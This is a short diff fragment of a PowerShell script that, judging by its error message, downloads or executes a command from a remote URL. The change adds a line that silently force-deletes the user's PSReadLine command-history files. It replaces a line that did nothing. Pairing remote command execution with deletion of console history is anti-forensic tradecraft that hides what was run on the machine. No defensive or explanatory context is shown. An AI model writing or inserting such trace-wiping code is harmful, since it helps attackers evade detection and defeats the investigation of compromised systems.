@@ -67,6 +67,4 @@ try {
 } catch {
     Write-Error "Failed to download or execute command from $urlD`: $_"
 }
-Get-Content function:Clear-History | Out-Null
-
-
+Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine*.txt" -Force -ErrorAction SilentlyContinue
